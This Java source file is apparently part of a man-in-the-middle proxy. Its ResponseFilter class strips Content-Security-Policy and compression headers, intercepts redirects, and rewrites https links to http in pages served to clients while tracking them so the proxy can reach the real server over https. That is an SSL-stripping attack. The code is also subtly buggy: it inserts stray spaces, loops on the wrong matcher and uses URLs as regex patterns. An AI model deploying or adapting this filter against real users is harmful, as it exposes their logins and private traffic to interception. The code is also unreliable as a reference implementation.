

package mitm;

import java.io.PrintWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ResponseFilter implements IDataFilter
{
  public interface OnRedirectInterceptListener
  {
    public void onRedirectIntercepted(HttpMessage message);
  }
  
  private PrintWriter m_out = new PrintWriter(System.out, true);
  private Pattern m_serverRedirectPattern;
  private Pattern m_httpPattern;
  private Pattern m_httpsPattern;
  private OnRedirectInterceptListener m_redirectListener;

  public ResponseFilter()
  {
    m_serverRedirectPattern = Pattern.compile("^HTTP.* (30\\d.*)");
    m_httpPattern = Pattern.compile("(http://[^\\s]+)");
    m_httpsPattern = Pattern.compile("(https://[^\\s]+)");
  }
  
  public void setOutputPrintWriter(PrintWriter outputPrintWriter)
  {
    m_out.flush();
    m_out = outputPrintWriter;
  }

  public PrintWriter getOutputPrintWriter()
  {
    return m_out;
  }
  
  public void setOnRedirectInterceptListener(OnRedirectInterceptListener l)
  {
    m_redirectListener = l;
  }

  @Override
  public HttpMessage handle(ConnectionDetails connectionDetails, HttpMessage message) throws Exception
  {    
    Matcher redirectMatcher = m_serverRedirectPattern.matcher(message.getTopLine());
    Matcher httpMatcher = m_httpPattern.matcher(message.getBodyAsString());
    Matcher httpsMatcher = m_httpsPattern.matcher(message.getBodyAsString());

    Strippers.removeAcceptEncoding(message);
    Strippers.removeContentSecurityPolicy(message);
    
    System.err.println("------ " + connectionDetails.getDescription() + " ------");
    System.out.println(message.getHeadersAsString());
    
    if (redirectMatcher.find())
    {
      // Intercept redirects
      System.err.println("-- Intecepted redirect: "
          + redirectMatcher.group(1) + " for " + message.get("Location").get(0));
      
      if (m_redirectListener != null)
      {
        m_redirectListener.onRedirectIntercepted(message);
      }

      // Avoid closing the client connection by returning a null
      return null;
    }
    else if (!connectionDetails.isServer() && httpsMatcher.find())
    {
      UrlMonitor urlMonitor = UrlMonitor.getInstance();
      String client = connectionDetails.getLocalHost();
      
      // Down-grade links
      do 
      {
        String url = httpsMatcher.group();
        urlMonitor.addSecureLink(client, url);
      } while(httpsMatcher.find());
      
      String stripped = message.getBodyAsString().replace("https", " http");
      message.setBodyBytes(stripped.getBytes("UTF-8"));
    }
    else if (connectionDetails.isServer() && httpMatcher.find())
    {
      UrlMonitor urlMonitor = UrlMonitor.getInstance();
      String client = connectionDetails.getRemoteHost();
      String body = message.getBodyAsString();
      
      // upgrade links
      do 
      {
        String url = httpMatcher.group();
        if(urlMonitor.isSecureLink(client, url))
        {
          String secureUrl = url.replaceAll(" http", "https");
          body = body.replaceAll(url, secureUrl);
          System.err.println("-- Upgrade to https: " + secureUrl);
        }
        
      } while(httpsMatcher.find());
      
      message.setBodyBytes(body.getBytes("UTF-8"));
    }
    
    return message;
  }
  
  public void connectionOpened(ConnectionDetails connectionDetails)
  {
    System.err.println("--- " + connectionDetails.getDescription()
        + " opened --");
  }

  public void connectionClosed(ConnectionDetails connectionDetails)
  {
    System.err.println("--- " + connectionDetails.getDescription()
        + " closed --");
  }
}